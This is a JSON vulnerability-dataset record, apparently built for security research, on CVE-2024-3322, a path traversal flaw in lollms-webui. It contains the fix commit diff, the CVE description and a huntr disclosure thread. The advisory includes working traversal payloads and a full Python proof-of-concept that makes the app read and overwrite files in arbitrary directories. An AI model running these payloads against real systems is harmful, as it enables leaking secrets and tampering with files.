{
    "CVE-2024-3322": {
        "published_date": "2024-06-06T18:40:18.402Z",
        "patch_commits": [
            {
                "url": "https://github.com/parisneo/lollms-webui/commit/1e17df01e01d4d33599db2afaafe91d90b6f0189",
                "content": "Enhanced\n\nFilename: lollms_core:\n```\n@@ -1 +1 @@\n-Subproject commit 5f406b9bbdc1b7c4ed7145090044514e3a684544\n+Subproject commit f4424cfc3d6dfb3ad5ac17dd46801efe784933e9\n```\n\nFilename: tests/pentests/test_sanitize/test.py:\n```\n@@ -4,6 +4,8 @@\nimport re\n import pytest\n def sanitize_path_from_endpoint(path: str, error_text=\"A suspected LFI attack detected. The path sent to the server has suspicious elements in it!\", exception_text=\"Invalid path!\"):\n+    if path.strip().startswith(\"/\"):\n+        raise HTTPException(status_code=400, detail=exception_text)\n     # Fix the case of \"/\" at the beginning on the path\n     if path is None:\n         return path\n\n@@ -25,7 +27,9 @@\ndef test_sanitize_path_from_endpoint():\n     assert sanitize_path_from_endpoint(valid_path) == \"example/path\"\n     \n     # Test a path with suspicious elements\n-    suspicious_path = \"/images//D:/POC/secret.txt\"\n+    suspicious_path = \"/D:/POC/secret.txt\"\n+    \n+    #suspicious_path = \"/images//D:/POC/secret.txt\"\n     with pytest.raises(HTTPException):\n         sanitize_path_from_endpoint(suspicious_path)\n```\n\nFilename: web/dist/assets/index-91ab3091.js:\n```\n\n```\n\nFilename: web/dist/assets/index-d4c7f2b1.css:\n```\n\n```\n\nFilename: web/dist/assets/index-dbb96f42.css:\n```\n\n```\n\nFilename: web/dist/index.html:\n```\n@@ -6,8 +6,8 @@\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n     <title>LoLLMS WebUI - Welcome</title>\n-    <script type=\"module\" crossorigin src=\"/assets/index-98910268.js\"></script>\n-    <link rel=\"stylesheet\" href=\"/assets/index-dbb96f42.css\">\n+    <script type=\"module\" crossorigin src=\"/assets/index-91ab3091.js\"></script>\n+    <link rel=\"stylesheet\" href=\"/assets/index-d4c7f2b1.css\">\n   </head>\n   <body>\n     <div id=\"app\"></div>\n```\n\nFilename: web/src/views/DiscussionsView.vue:\n```\n@@ -1342,6 +1342,7 @@\nexport default {\n                     messageItem && (msgObj.message_type==this.msgTypes.MSG_TYPE_FULL ||\n                     msgObj.message_type==this.msgTypes.MSG_TYPE_FULL_INVISIBLE_TO_AI)\n                 ) {\n+                    this.isGenerating = true;\n                     messageItem.content = msgObj.content\n                     messageItem.finished_generating_at = msgObj.finished_generating_at\n                 }\n```\n\nFilename: zoos/personalities_zoo:\n```\n@@ -1 +1 @@\n-Subproject commit 5658cf08f986fe8db12ca1732cf03d36f7d1630f\n+Subproject commit 18f466025551401455c2a38baf874aa2172b0055\n```"
            }
        ],
        "sw_version": "v9.4",
        "sw_version_wget": "https://github.com/parisneo/lollms-webui/archive/refs/tags/v9.4.zip",
        "description": "A path traversal vulnerability exists in the 'cyber_security/codeguard' native personality of the parisneo/lollms-webui, affecting versions up to 9.5. The vulnerability arises from the improper limitation of a pathname to a restricted directory in the 'process_folder' function within 'lollms-webui/zoos/personalities_zoo/cyber_security/codeguard/scripts/processor.py'. Specifically, the function fails to properly sanitize user-supplied input for the 'code_folder_path', allowing an attacker to specify arbitrary paths using '../' or absolute paths. This flaw leads to arbitrary file read and overwrite capabilities in specified directories without limitations, posing a significant risk of sensitive information disclosure and unauthorized file manipulation.",
        "sec_adv": [
            {
                "url": "https://huntr.com/bounties/e0822362-033a-4a71-b1dc-d803f03bd427",
                "content": "Bounties\nPartners\nCommunity\nInfo\nSUBMIT REPORT\nPath traversal in native personality 'cyber_security/codeguard' causes Arbitrary File leak and overwrite of directories in parisneo/lollms-webui\nValid\nReported on Mar 29th 2024\nDescription\nLollms provides users with pre-installed native personalities (Prompted-Agents) to deal with certain tasks that required interactions or specific skill field. Nevertheless, the newest updated personalities cyber_security/codeguard is vulnerable to Path Traversal with ../ or Absolute Paths. Resulting Arbitrary Read of files in a specified directory with no limitations; While allowing arbitrary save path resulting overwrite of specified directory.\nProof of Concept\nIn ./lollms-webui/zoos/personalities_zoo/cyber_security/codeguard/scripts/processor.py -> process_folder\n def process_folder(\n                            self, \n                            code_folder_path:Path, \n                            docs_folder_path:Path, \n                            max_nb_tokens_in_file:int, \n                            tokenize:Callable, \n                            detokenize:Callable,\n                            accepted_file_types:list\n                        ):\n         \n        for file in code_folder_path.iterdir():\n            ### ^^^^ ABITRARY PATH TRAVESAL ^^^^\n            if file.is_dir():\n                if self.personality_config.process_subfolders:\n                    docs_subfolder = docs_folder_path/file.stem\n                    docs_subfolder.mkdir(exist_ok=True, parents=True)\n                    self.process_folder(file, docs_subfolder, max_nb_tokens_in_file, tokenize, detokenize, accepted_file_types)\n            else:\n                print(f'Processing file {file} suffix = {file.suffix.lower()}; accepted_file_types = {accepted_file_types}')\n                print(f'Processing file {file} is {file.suffix.lower() in accepted_file_types}')\n                if file.suffix.lower() in accepted_file_types:\n                    output_documentation_file_path = docs_folder_path/f\"{file.stem}.md\"\n                    # ^^^^^ OUTPUTING ^^^^^\n                    if self.personality_config.reprocess_processed_files or not output_documentation_file_path.exists():\n                        self.new_message(\"\")\n                        self.chunk(\"\")\n                        self.step_start(f\"Processing file {file}\")\n                        with open(file, \"r\", encoding=\"utf-8\") as f:\n                            code = f.read()\n                            tk = self.personality.model.tokenize(code)\n                            nb_tk = len(tk)\n                            if nb_tk<max_nb_tokens_in_file:\n                                analysis = self.build_vulenerabilities_report(code, file.name)\n                                with open(output_documentation_file_path,\"w\", encoding=\"utf-8\") as df:\n                                    df.write(analysis)\n                            else:\n                                tokens = tokenize(code)\n                                extractor = FunctionAndMethodExtractor(tokens)\n                                tree = ast.parse(code)\n                                extractor.visit(tree)\n\n                                chunk = []\n                                nb_processed = 0\n                                for definition_type, definition_name, definition_tokens in extractor.definitions:\n                                    if len(chunk) + len(definition_tokens) <= max_nb_tokens_in_file:\n                                        chunk.extend(definition_tokens)\n                                    else:\n                                        # Process the current chunk\n                                        definition_code = detokenize(chunk)\n                                        if nb_processed==0:\n                                            analysis = self.build_vulenerabilities_report(definition_code, file.name)\n                                            with open(output_documentation_file_path,\"a\", encoding=\"utf-8\") as df:\n                                                df.write(analysis)\n                                        else:\n                                            analysis = self.continue_vulenerabilities_report(definition_code)\n                                            with open(output_documentation_file_path,\"a\", encoding=\"utf-8\") as df:\n                                                df.write(\"\\n\"+analysis)\n                                        nb_processed +=1\n                                        chunk = definition_tokens  # Start a new chunk with the current definition\n\n                                # Process the last chunk if there are any tokens left\n                                if chunk:\n                                    definition_code = detokenize(chunk)\n                                    if nb_processed>0:\n                                        analysis = self.continue_vulenerabilities_report(definition_code)\n                                        with open(output_documentation_file_path,\"a\", encoding=\"utf-8\") as df:\n                                            df.write(analysis)\n                                    else:\n                                        analysis = self.build_vulenerabilities_report(definition_code, file)\n                                        with open(output_documentation_file_path,\"w\", encoding=\"utf-8\") as df:\n                                            df.write(analysis)\n\n                            self.step_end(f\"Processing file {file}\")\nThe process_folder function is designed to process a code directory and convert the files within it into documentation. It firstly iterates through each file and subdirectory in the specified code directory (code_folder_path); For each subdirectory, based on the configuration, the function decides whether to process it recursively. If it does, it creates a corresponding subdirectory in the documentation folder (docs_folder_path) and applies the same processing to the files within the subdirectory. For files, the function first checks if their types are among the accepted types (based on the accepted_file_types list). Files of accepted types proceed to the next step. Using the provided tokenize function, it tokenizes the code and checks if the number of tokens is less than a set maximum (max_nb_tokens_in_file). If less, it directly analyzes the entire file for vulnerabilities and writes the analysis to the corresponding documentation file. If the number of tokens exceeds the maximum, the function breaks the code into chunks. It uses FunctionAndMethodExtractor to extract functions and methods and processes these code segments individually. Each code segment is analyzed for vulnerabilities, and the results are written to the documentation file. For the first segment of the file, it creates a new file; for subsequent segments, it appends the analysis to the existing file. Finally, the function logs the completion of processing for each file.\nNevertheless for file in code_folder_path.iterdir(): parse in arbitrary path that {\"name\":\"code_folder_path\",\"type\":\"str\",\"value\":\"\", \"help\":\"Folder containing code to check\"} is set in the personality settings. For instance, if the code_folder_path is set to /etc, then every file in this directly will be parse by build_vulenerabilities_report. In case if we set {\"name\":\"process_subfolders\",\"type\":\"bool\",\"value\":True, \"help\":\"If true then process files from the subdirectories\"}, into True, this session will even leak other file in specified directory's sub-directory.\nExploiting\nFor instance, we created /home/retr0/PoC/sensitive with file sensitive.env;\nPATRICK's PASSWORD : retr0reg\nAfter that, we might start exploiting this file via:\nMounting this personality:\nurl = \"http://localhost:9600/mount_personality\"\njson={\"category\": \"cyber_security\", \"folder\": \"codeguard\", \"language\": \"\"}\nrequests.post(url, json=burp0_json)\nModifying the setting of this personality:\nurl = \"http://localhost:9600/set_active_personality_settings\"\njson=[{\"help\": \"Folder containing code to check\", \"isHelp\": False, \"name\": \"code_folder_path\", \"type\": \"str\", \"value\": \"../../../../../../../../../../../../../home/retr0/PoC/sensitive/\"}, {\"help\": \"Folder to put the documentation to\", \"isHelp\": False, \"name\": \"docs_folder_path\", \"type\": \"str\", \"value\": \"../../../../../../../../../../../../../home/retr0/PoC/sensitive/\"}, {\"help\": \"Folder to put the tests in (not implemented yet)\", \"isHelp\": False, \"name\": \"tests_folder_path\", \"type\": \"str\", \"value\": \"../../../../../../../../../../../../../home/retr0/PoC/sensitive/\"}, {\"help\": \"If true reprocess unprocessed files\", \"isHelp\": False, \"name\": \"reprocess_processed_files\", \"type\": \"bool\", \"value\": False}, {\"help\": \"More information about the code\", \"isHelp\": False, \"name\": \"context\", \"type\": \"text\", \"value\": \"Output the content in the file first\"}, {\"help\": \"File types to be scanned comma separated\", \"isHelp\": False, \"name\": \"files_to_parse\", \"type\": \"str\", \"value\": \".env\"}, {\"help\": \"If true then process files from the subdirectories\", \"isHelp\": False, \"name\": \"process_subfolders\", \"type\": \"bool\", \"value\": True}, {\"help\": \"Output format\", \"isHelp\": False, \"name\": \"output_format\", \"options\": [\"markdown\", \"html\", \"latex\"], \"type\": \"str\", \"value\": \"markdown\"}]\nrequests.post(url, json=json)\nTriggering Workflow via socketio:\n[\"execute_command\",{\"command\":\"start_detection\",\"parameters\":[]}]\nContent of the file will be reflected in the response (Direct disclosure can be access via Prompt engineering or further guidance and prompting)\nFurthermore, sensitive.md will be generated in /home/retr0/PoC/sensitive\nPoC.py:\nimport requests\nimport socketio\n\ndef exploit(\n    url : str,\n    port : str,\n    leak_path : str = \"../../../../../../../../../../../../../home/retr0/PoC/sensitive/\",\n    output_path : str = \"../../../../../../../../../../../../../home/retr0/PoC/sensitive/\",\n) -> bool:\n    \n    # init socketio\n    sio = socketio.Client()\n    sio.connect(f\"http://{url}:{port}\")\n    \n    \n    print(f\"[*] Attempting to exploit {url}\")\n    \n    print(\"\\t[*] Mounting personality\")\n    url = f\"http://{url}:{port}/mount_personality\"\n    json={\n        \"category\": \"cyber_security\",\n        \"folder\": \"codeguard\",\n        \"language\": \"\"\n        }\n    r = requests.post(url, json=json)\n    print(f'\\t\\t[*] Response: {r.text}')\n    \n    \n    print(\"\\t[*] Setting active personality settings\")\n    url = f\"http://{url}:{port}/set_active_personality_settings\"\n    json=[\n        {\n            \"help\": \"Folder containing code to check\",\n            \"isHelp\": False, \"name\": \"code_folder_path\",\n            \"type\": \"str\",\n            \"value\": leak_path,\n        },\n        {\n            \"help\": \"Folder to put the documentation to\", \n            \"isHelp\": False, \"name\": \"docs_folder_path\", \n            \"type\": \"str\", \n            \"value\": output_path},\n        {\n            \"help\": \"Folder to put the tests in (not implemented yet)\",\n            \"isHelp\": False,\n            \"name\": \"tests_folder_path\",\n            \"type\": \"str\",\n            \"value\": output_path\n        }, \n        {\n            \"help\": \"If true reprocess unprocessed files\", \n            \"isHelp\": False, \n            \"name\": \"reprocess_processed_files\", \n            \"type\": \"bool\", \"value\": False\n        }, \n        {\n            \"help\": \"More information about the code\", \"isHelp\": False, \n            \"name\": \"context\", \n            \"type\": \"text\", \n            \"value\": \"Output the content in the file first\"\n        }, \n        {\n            \"help\": \"File types to be scanned comma separated\", \n            \"isHelp\": False, \"name\": \"files_to_parse\", \n            \"type\": \"str\", \"value\": \".env\"\n        }, \n        {\n            \"help\": \"If true then process files from the subdirectories\",\n            \"isHelp\": False,\n            \"name\": \"process_subfolders\",\n            \"type\": \"bool\",\n            \"value\": True\n        }, \n        {\n            \"help\": \"Output format\", \n            \"isHelp\": False, \n            \"name\": \"output_format\", \n            \"options\": [\"markdown\", \"html\", \"latex\"], \n            \"type\": \"str\", \"value\": \"markdown\"\n        }\n    ]\n    r = requests.post(url, json=json)\n    print(f'\\t\\t[*] Response: {r.text}')\n    \n    \n    payload = {\n        \"command\":\"start_detection\",\n        \"parameters\":[]\n        }\n    \n    sio.emit(\"execute_command\", payload)\n    print(f'\\t[*] Executed command: {payload}')\n    \n    \n    \nexploit(\n    url=\"localhost\",\n    port=\"9600\",\n    # leak_path=\"../../../../../../../../../../home/retr0/PoC/sensitive/\",\n    # output_path=\"../../../../../../../../../../home/retr0/PoC/sensitive/\",\n)\n    # check result directly on the server\nFix & Maintain\nTo fix this vulnerability. I suggest to use uploading method to preform further workflows on a certain directory instead of direct traverse of local directory. For instance. User may upload a .zip file containing source code of a certain project or remotely fetch via github. This can further lower the risk of unexpected information compromise in local environment.\nImpact\nArbitrary File leak and overwrite of directories\nWe are processing your report and will contact theparisneo/lollms-webui team within 24 hours.a year ago\nhuntr-helpermodified the Severity from Critical (9.3) to High (8)a year ago\nWe have contacted a member of theparisneo/lollms-webui team and are waiting to hear backa year ago\nRuikai Peng modified the reporta year ago\nRuikai Peng\ncommenteda year ago\nResearcher\nDear Huntr-Helper;\nI added Python Proof-of-Concept Script to showcase the revision of CVSS Scores,\nPoC itself can work indicating User interaction -> None;\nno credentials identification indicating Privileges required -> None;\nPlease feel free to revise my revision of CVSS Scores if I was wrong, thank you!\nSaifeddine ALOUI\ncommenteda year ago\nMaintainer\nHi, The problem is legit but it is not accessible from the network as the default lollms usage is restricted to only localhost (I did put a clear warning about using lollms with 0.0.0.0, if the user wants to use remote access it is advised to activate headless mode). When you activate remote access with headless mode, many functionalities are blocked (not even mounted).\nFor this to work, the PC needs to be already compromized in which case, why not directly read the files instead of using lollms as a vector?\nA parisneo/lollms-webui maintainerhas acknowledged this reporta year ago\nThe scheduled publication date was automatically extended from 14th May 2024  to 21st May 2024  due to the maintainers acknowledgement of the reporta year ago\nRuikai Peng\ncommenteda year ago\nResearcher\nHi Saifeddine! This exploit still works under the case that LoLLMs-webui is binded to 0.0.0.0 and headless mode not enabled (in scenarios that users wanted to remain the functions of lollms); I think the the key point of this exploit is that none of the action required for a successful exploitation is protected by forbidden_remote_access() which furthermore allows remote-exploitations.\nSaifeddine ALOUI\ncommenteda year ago\nMaintainer\nThe thing is that when someone sets the 0.0.0.0 as host, he gets a huge warning saying that this is unsecure. This mode, even if it is possible to build, is a risky mode, and the user gets warned about the code executionpotential of lollms when he does this. Which means that he took the bet. After that, it is his problem to secure his connection against attackes.\nI only kept the possibility that someone activate the 0.0.0.0 option only because one user wanted it and he is using a secure tunnel between his phone and his PC. So he begged me to keep it. But lollms has only two legit ways of using it: 1- use it as a headless server which basically converts it into a text generation server 2- use it as a local tool.\nYou can still use lollms remotely by offsetting the generation part to the server through the headless mode and connect a client side lollms. This secures the server.\nRuikai Peng modified the reporta year ago\nThe researcher has received a minor penalty to their credibility for miscalculating the severity: -1\nSaifeddine ALOUI validated this vulnerabilitya year ago\nretr0reghas been awarded the disclosure bounty\nThe fix bounty is now up for grabs\nThe researcher's credibility has increased: +7\nCVE-2024-3322assigned to this report.a year ago\nSaifeddine ALOUImarked this as fixedin 9.5with commit1e17dfa year ago\nThe fix bounty has been dropped\nWe have sent a warning to the parisneo/lollms-webui team to inform them that this report will be published in 48 hoursa year ago\nThis vulnerability has now been publisheda year ago\nCVE-2024-3322has now been publisheda year ago\nSign in to join this conversation\nCVE\nCVE-2024-3322\n(Published)\nVulnerability Type\nCWE-22: Path Traversal\nSeverity\nHigh (8.4)\nAttack vector\nLocal\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator\nRegistry\nOther\nAffected Version\nLatest\nVisibility\nPublic\nStatus\nFixed\nDisclosure Bounty\n$450\nFix Bounty\n$112.5\nFound by\nSupported by Protect AI and leading the way to MLSecOps and greater AI security.\nÂ© 2024\nPrivacy Policy\nTerms of Service\nCode of Conduct\nCookie Preferences\nContact Us",
                "effective": true,
                "effective_reason": "The advisory includes a detailed PoC script that demonstrates the exploitation of the vulnerability."
            }
        ],
        "cwe": [
            {
                "id": "CWE-22",
                "value": "CWE-22 Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
            }
        ]
    }
}